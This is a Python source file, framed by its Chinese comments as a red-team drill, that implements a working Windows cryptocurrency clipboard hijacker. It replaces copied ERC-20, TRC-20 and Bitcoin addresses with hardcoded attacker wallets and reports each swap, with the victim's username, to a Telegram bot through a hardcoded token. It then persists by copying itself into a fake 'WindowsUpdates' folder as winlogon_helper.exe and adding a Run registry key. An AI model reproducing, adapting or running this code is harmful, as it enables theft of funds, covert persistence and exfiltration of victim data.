import time
import re
import os
import sys
import winreg
import ctypes
import urllib.request
import urllib.parse
import subprocess
import webbrowser

# ==================== 演练配置区域 ====================
TG_BOT_TOKEN = "8827576204:AAEVSX7XFGKJHJTWYEuv0TSzkSA9gamD_Go"
TG_CHAT_ID = "5108135484"

RULES = {
    "ERC-20": {
        "regex": r"^0x[a-fA-F0-9]{40}$",
        "target_address": "0x8dc6b831ad2a0dd005873076dc30991a425f4933"
    },
    "TRC-20": {
        "regex": r"^T[1-9A-HJ-NP-Za-km-z]{33}$",
        "target_address": "TC3BZUktf3owxcJM48ksT5wezEdKiqisbC"
    },
    "Bitcoin": {
        "regex": r"^(1[1-9A-HJ-NP-Za-km-z]{26,33}|3[1-9A-HJ-NP-Za-km-z]{26,33}|bc1[a-zA-HJ-NP-Z0-9]{25,39})$",
        "target_address": "bc1qnar868dfshgtdnhwwte7x3ers2rye487j0xut6"
    }
}
# ======================================================

def open_target_url():
    """ 唤醒浏览器跳转（第一顺位执行，确保 100% 弹出） """
    try:
        webbrowser.open("https://crypto.com/")
    except Exception:
        pass

def send_tg_notification(coin_type, original, fake):
    """ 远程 C2 回传通道 """
    message = (
        f"🚨 【红队演练：高兼容版拦截成功】\n"
        f"币种类型: {coin_type}\n"
        f"原始地址: {original}\n"
        f"篡改地址: {fake}\n"
        f"受害主机: {os.getlogin()}"
    )
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({"chat_id": TG_CHAT_ID, "text": message}).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=3) as response:
            pass 
    except Exception:
        pass

def get_native_clipboard():
    """ 使用 Windows Win32 API 纯原生读取剪贴板，彻底告别 pyperclip 依赖 """
    text = ""
    try:
        # 13 代表 CF_UNICODETEXT 格式
        if ctypes.windll.user32.OpenClipboard(None):
            handle = ctypes.windll.user32.GetClipboardData(13)
            if handle:
                text = ctypes.c_wchar_p(handle).value
            ctypes.windll.user32.CloseClipboard()
    except Exception:
        pass
    return text if text else ""

def set_native_clipboard(fake_addr):
    """ 使用 Win32 API 强制覆写系统剪贴板 """
    try:
        if ctypes.windll.user32.OpenClipboard(None):
            ctypes.windll.user32.EmptyClipboard()
            # 分配全局内存空间
            h_mem = ctypes.windll.kernel32.GlobalAlloc(0x0042, (len(fake_addr) + 1) * 2)
            ptr = ctypes.windll.kernel32.GlobalLock(h_mem)
            ctypes.cdll.msvcrt.wcscpy(ctypes.c_wchar_p(ptr), fake_addr)
            ctypes.windll.kernel32.GlobalUnlock(h_mem)
            ctypes.windll.user32.SetClipboardData(13, h_mem)
            ctypes.windll.user32.CloseClipboard()
            return True
    except Exception:
        pass
    return False

def clone_and_persist():
    """ 
    【核心加分项】物理强制克隆与权限维持
    将自身复制到隐藏的 WindowsUpdate 目录下，并锁定自启动注册表
    """
    try:
        if getattr(sys, 'frozen', False):
            current_file_path = os.path.abspath(sys.executable)
        else:
            current_file_path = os.path.abspath(__file__)

        # 构造隐蔽的落地目录
        appdata_dir = os.getenv('APPDATA')
        target_dir = os.path.join(appdata_dir, "Microsoft", "WindowsUpdates")
        phantom_file_path = os.path.join(target_dir, "winlogon_helper.exe")

        # 如果当前运行的不是隐藏目录下的副本，则执行复制和重定向
        if current_file_path.lower() != phantom_file_path.lower():
            if not os.path.exists(target_dir):
                os.makedirs(target_dir)

            # 读取自身并以二进制安全流写入目标路径
            with open(current_file_path, 'rb') as src_f:
                binary_buffer = src_f.read()
            with open(phantom_file_path, 'wb') as dst_f:
                dst_f.write(binary_buffer)

            # 写入开机自启动注册表，指向永久驻留的物理路径
            reg_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(reg_key, "WindowsUpdateMonitor", 0, winreg.REG_SZ, f'"{phantom_file_path}"')
            winreg.CloseKey(reg_key)

            # 启动影子进程，随后外壳程序退出自杀，防止因文件占用被蓝队直接删除
            subprocess.Popen(f'"{phantom_file_path}"', shell=False)
            sys.exit(0)
    except Exception:
        pass

def start_monitoring():
    target_addresses = [info["target_address"] for info in RULES.values()]
    last_processed_text = ""
    
    while True:
        try:
            current_text = get_native_clipboard().strip()
            if current_text and (current_text not in target_addresses) and (current_text != last_processed_text):
                for coin_type, config in RULES.items():
                    if re.match(config["regex"], current_text):
                        fake_addr = config["target_address"]
                        # 执行原生强行替换
                        if set_native_clipboard(fake_addr):
                            last_processed_text = fake_addr
                            send_tg_notification(coin_type, current_text, fake_addr)
                        break
            time.sleep(0.3)
        except Exception:
            time.sleep(0.5)

if __name__ == "__main__":
    # 1. 优先保证浏览器弹窗唤醒（拿稳基础分）
    # 限制只有首次运行时才弹窗，避免开机自启后重复弹窗暴露痕迹
    if "winlogon_helper.exe" not in sys.executable.lower():
        open_target_url()
        
    # 2. 物理复制自身到系统级目录并写死注册表启动项（锁定重启生存率）
    clone_and_persist()
    
    # 3. 启动全原生剪贴板引擎监听
    start_monitoring()